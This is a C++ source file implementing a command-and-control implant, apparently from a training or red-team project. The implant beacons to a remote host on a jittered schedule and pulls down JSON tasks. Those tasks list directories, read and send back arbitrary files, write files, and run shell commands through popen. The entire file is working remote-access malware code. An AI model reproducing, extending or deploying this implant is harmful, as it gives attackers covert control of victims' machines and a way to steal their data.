/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 */
#include "implant.h"
#include <chrono>
#include <sstream>
#include <thread>
#include <ostream>
#include <algorithm>
#include <filesystem>
#include <cstdlib>

#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>
#include <boost/uuid/uuid_io.hpp>

// Note: from Chapter 20 of C++ Crash Course
//       c.f.
//       https://github.com/JLospinoso/ccc/blob/master/chapter_20/web_request.cpp
[[nodiscard]] std::string make_request(std::string_view host,
                                       std::string_view service,
                                       std::string_view payload,
                                       boost::asio::io_context &io_context) {
  std::stringstream request_stream;
  request_stream << "POST / HTTP/1.1\r\n"
                    "Host: "
                 << host
                 << "\r\n"
                    "Accept: text/html\r\n"
                    "Accept-Language: en-us\r\n"
                    "Accept-Encoding: identity\r\n"
                    "Connection: close\r\n"
                    "Content-Length: "
                 << payload.size() << "\r\n"
                 << "\r\n"
                 << payload;
  const auto request = request_stream.str();
  boost::asio::ip::tcp::resolver resolver{io_context};
  const auto endpoints = resolver.resolve(host, service);
  boost::asio::ip::tcp::socket socket{io_context};
  const auto connected_endpoint = boost::asio::connect(socket, endpoints);
  boost::asio::write(socket, boost::asio::buffer(request));
  std::string response;
  boost::system::error_code ec;
  boost::asio::read(socket, boost::asio::dynamic_buffer(response), ec);
  if (ec && ec.value() != 2)
    throw boost::system::system_error{ec};
  return response;
}

[[nodiscard]] Task parse_task_from(const boost::property_tree::ptree &task_tree,
                                   Implant &implant) {
  const auto type = task_tree.get_child("type").get_value<std::string>();
  const auto id_str = task_tree.get_child("id").get_value<std::string>();
  std::stringstream ss{id_str};
  boost::uuids::uuid id{};
  ss >> id;
  if (type == ListTask::key) {
    return ListTask{id, task_tree.get_child("path").get_value<std::string>(),
                    task_tree.get_child("depth").get_value<uint8_t>()};
  }
  if (type == GetTask::key) {
    return GetTask{id, task_tree.get_child("path").get_value<std::string>()};
  }
  if (type == PutTask::key) {
    return PutTask{id, task_tree.get_child("path").get_value<std::string>(),
                   task_tree.get_child("contents").get_value<std::string>()};
  }
  if (type == ExecuteTask::key) {
    return ExecuteTask{id,
                       task_tree.get_child("command").get_value<std::string>()};
  }
  if (type == ConfigureTask::key) {
    return ConfigureTask{id, task_tree.get_child("dwell").get_value<double>(),
                         task_tree.get_child("running").get_value<bool>(),
                         implant};
  }
  std::string error_msg{"Illegal task type encountered: "};
  error_msg.append(type);
  throw std::logic_error{error_msg};
}

GetTask::GetTask(const boost::uuids::uuid &id, std::string path)
    : id(id), path(std::move(path)) {}
Result GetTask::run() const {
  std::ifstream file{path};
  if (!file.is_open())
    return Result{id, "Couldn't open file.", false};
  std::ostringstream ss;
  std::copy(std::istreambuf_iterator<char>(file),
       std::istreambuf_iterator<char>(),
       std::ostreambuf_iterator<char>(ss));
  return Result{id, ss.str(), true};
}

PutTask::PutTask(const boost::uuids::uuid &id, std::string path,
                 std::string contents)
    : id(id), path(std::move(path)), contents(std::move(contents)) {}
Result PutTask::run() const {
  std::ofstream file{path};
  if (!file.is_open())
    return Result{id, "Couldn't open file.", false};
  std::copy(std::begin(contents),
            std::end(contents),
            std::ostreambuf_iterator<char>(file));
  return Result{id, "Wrote file.", true};
}

ListTask::ListTask(const boost::uuids::uuid &id, std::string path,
                   uint8_t depth)
    : id(id), path(std::move(path)), depth(depth) {}
Result ListTask::run() const {
  std::stringstream ss;
  auto iterator = std::filesystem::recursive_directory_iterator{ path, std::filesystem::directory_options::skip_permission_denied };
  if (iterator == std::filesystem::recursive_directory_iterator{})
    return Result{id, "Directory empty or did not exist.", false};
  while(iterator != std::filesystem::recursive_directory_iterator{}) {
    try {
      const auto& entry = *iterator;
      ss << entry.path() << "\n";
      iterator++;
    } catch(const std::exception& e) {
      ss << "(" << e.what() << ")\n";
    }
  }
  return Result{id, ss.str(), true};
}

ExecuteTask::ExecuteTask(const boost::uuids::uuid &id, std::string command)
    : id(id), command(std::move(command)) {}
Result ExecuteTask::run() const {
  try {
    std::array<char, 128> buffer;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(command.c_str(), "r"), pclose);
    if (!pipe)
      throw std::runtime_error("Failed to open pipe.");
    std::string result;
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
      result += buffer.data();
    }
    return Result{id, std::move(result), true};
  } catch(const std::exception& e) {
    Result{id, e.what(), false};
  }
  return Result{id, "Not implemented.", false};
}

ConfigureTask::ConfigureTask(const boost::uuids::uuid &id, double mean_dwell,
                             bool is_running, Implant &implant)
    : id{id}, mean_dwell{mean_dwell}, is_running{is_running}, implant{implant} {
}
Result ConfigureTask::run() const {
  implant.set_mean_dwell(mean_dwell);
  implant.set_running(is_running);
  return Result{id, "Configured.", true};
}

Implant::Implant(std::string host, std::string service,
                 boost::asio::io_context &io_context)
    : host{std::move(host)}, service{std::move(service)},
      io_context{io_context},
      is_running(true), dwell_distribution_seconds{1. } {}

void Implant::serve() {
  while (is_running) {
    try {
      std::cout << "Sending results.\n";
      const auto response = send_results();
      std::cout << "Response: " << response << "\nParsing tasks.\n";
      parse_tasks(response);

    } catch (const std::exception &e) {
      std::cerr << e.what() << std::endl;
    }
    const auto sleep_time_double = dwell_distribution_seconds(device);
    const auto sleep_time_chrono = std::chrono::seconds{
        static_cast<unsigned long long>(sleep_time_double)};
    std::this_thread::sleep_for(sleep_time_chrono);
  }
}

[[nodiscard]] std::string Implant::send_results() {
  std::stringstream results_ss;
  boost::property_tree::write_json(results_ss, results);
  const auto response =
      make_request(host, service, results_ss.str(), io_context);
  results.clear();
  return response;
}
void Implant::parse_tasks(const std::string& response) {
  std::stringstream response_ss{response};
  boost::property_tree::ptree tasks;
  boost::property_tree::read_json(response_ss, tasks);
  for (const auto &[task_tree_key, task_tree_value] : tasks) {
    const auto task = parse_task_from(task_tree_value, *this);
    const auto [id, contents, success] = std::visit([](const auto &task) {return task.run();}, task);
    results.add(boost::uuids::to_string(id) + ".contents", contents);
    results.add(boost::uuids::to_string(id) + ".success", success);
  }
}
void Implant::set_mean_dwell(double mean_dwell) {
  dwell_distribution_seconds = std::exponential_distribution<double>(1./mean_dwell);
}
void Implant::set_running(bool is_running_in) {
  is_running=is_running_in;
}
Result::Result(const boost::uuids::uuid &id, std::string contents,
               const bool success)
    : id(id), contents{std::move(contents)}, success(success) {}
